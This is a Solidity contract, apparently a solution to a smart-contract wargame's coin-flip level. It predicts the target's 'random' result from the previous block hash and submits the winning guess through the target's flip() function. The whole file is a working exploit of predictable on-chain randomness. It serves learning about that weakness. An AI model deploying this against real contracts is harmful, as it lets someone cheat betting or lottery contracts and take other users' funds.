// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    using SafeMath for uint256;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function guessFlip(uint256 blockNum) public view returns (bool) {
        uint256 blockValue = uint256(blockhash(blockNum.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        return side;
    }

    function getBlockNum() public view returns (uint256) {
        return block.number;
    }

    function flip() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        return side;
    }

    function guessFlip(address addr) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);

        bool guessedSide = coinFlip == 1 ? true : false;

        return ICoinFlip(addr).flip(guessedSide);
    }
}
